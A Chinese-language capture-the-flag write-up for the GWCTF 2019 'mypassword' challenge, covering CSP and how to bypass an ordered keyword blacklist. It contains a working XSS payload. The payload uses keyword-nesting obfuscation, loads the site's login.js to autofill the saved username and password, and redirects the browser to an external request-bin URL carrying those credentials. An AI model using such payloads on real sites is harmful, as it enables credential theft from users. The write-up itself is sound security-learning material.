# \[GWCTF 2019]mypassword

## \[GWCTF 2019]mypassword

## 考点

* CSP
* 利用逻辑错误绕过正则黑名单

## wp

注册登录两个功能，F12看到有个login.js，意思是把用户信息写到cookie里面

```javascript
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}
}
```

登录后有个反馈功能feedback.php，在list.php可以看到反馈内容，应该是个xss打cookie。

提交`<svg onload=alert(1)>` 返回的内容是`< =alert(1)>` 是有过滤的。

feedback.php有注释，可以看到过滤的内容，`str_ireplace` 为不区分大小写进行替换

```php
if(is_array($feedback)){
    echo "<script>alert('反馈不合法');</script>";
    return false;}
$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
foreach ($blacklist as $val) {
    while(true){
        if(stripos($feedback,$val) !== false){
            $feedback = str_ireplace($val,"",$feedback);}else{break;}}}		    
```

在访问/content.php?id=1的时候发现返回头中有CSP，这个CSP策略的意思是只能执行本页面的js语句。

```javascript
Content-Security-Policy: default-src 'self';script-src 'unsafe-inline' 'self'
```

看那个过滤，实际上有个逻辑错误，例如我想使用getElement这个关键字，那就在getElement中插入黑名单中getElement之后的关键字，document或cookie，提交getdocumentElement就可以得到getElement了。因为这里循环是按照顺序循环的，只有目标关键字在黑名单之前就可以绕过了。

然后就可以构造payload了，首先需要执行login.js才能把账号密码写入cookie，执行login.js还需要username和password的input，都用cookie套一下，在feedback.php发送，在list.php查看，在vps接收即可，或者在（~~https://beeceptor.com/~~）在http://requestbin.cn/接收

```
http://requestbin.cn:80/peri0d
```

```
<inpcookieut type="text" name="username"></inpcookieut>
<inpcookieut type="text" name="password"></inpcookieut>
<scricookiept scookierc="./js/login.js"></scricookiept>
<scricookiept>
	var uname = documcookieent.getElemcookieentsByName("username")[0].value;
	var passwd = documcookieent.getElemcookieentsByName("password")[0].value;
	var res = uname + " " + passwd;
	documcookieent.locacookietion="http://requestbin.cn:80/peri0d/?res="+res;
</scricookiept>
```

## 小结

1. xss的payload要根据加载的js写
2. https://beeceptor.com/就试试http://requestbin.cn/
